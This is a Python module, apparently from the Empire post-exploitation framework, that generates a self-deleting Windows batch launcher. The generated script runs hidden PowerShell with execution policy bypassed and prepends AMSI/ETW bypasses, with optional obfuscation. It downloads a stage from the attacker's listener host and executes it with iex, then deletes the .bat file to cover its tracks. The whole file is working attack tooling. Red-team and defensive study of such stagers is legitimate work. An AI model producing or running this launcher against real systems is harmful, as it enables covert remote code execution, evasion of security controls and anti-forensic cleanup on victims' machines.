from __future__ import print_function

import base64
import logging
from builtins import object

from empire.server.core.db.base import SessionLocal

log = logging.getLogger(__name__)


class Stager(object):
    def __init__(self, mainMenu, params=[]):
        self.info = {
            "Name": "BAT Launcher",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": "Generates a self-deleting .bat launcher for Empire. Only works with the HTTP and HTTP COM listeners.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "launcher.bat",
            },
            "Delete": {
                "Description": "Switch. Delete .bat after running.",
                "Required": False,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "mattifestation etw",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]["Value"] = value

    def generate(self):
        # extract all of our options
        listener_name = self.options["Listener"]["Value"]
        delete = self.options["Delete"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        bypasses = self.options["Bypasses"]["Value"]

        if obfuscate.lower() == "true":
            obfuscate = True
        else:
            obfuscate = False

        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
        host = listener.options["Host"]["Value"]

        launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"

        # generate base64 of obfuscate command for first stage
        if obfuscate:
            launcher_obfuscate_command = f"{obfuscate_command}:"

        else:
            launcher_obfuscate_command = ":"

        if bypasses:
            launcher_bypasses = f"{bypasses}"
        else:
            launcher_bypasses = ""

        launcher_end = base64.b64encode(
            (launcher_obfuscate_command + launcher_bypasses).encode("UTF-8")
        ).decode("UTF-8")
        launcher_end += "') -UseBasicParsing|iex\""

        launcher = launcher + launcher_end

        if host == "":
            log.error("[!] Error in launcher command generation.")
            return ""

        else:
            code = "@echo off\n"
            code += "start /b " + launcher + "\n"

            if delete.lower() == "true":
                # code that causes the .bat to delete itself
                code += '(goto) 2>nul & del "%~f0"\n'

            return code
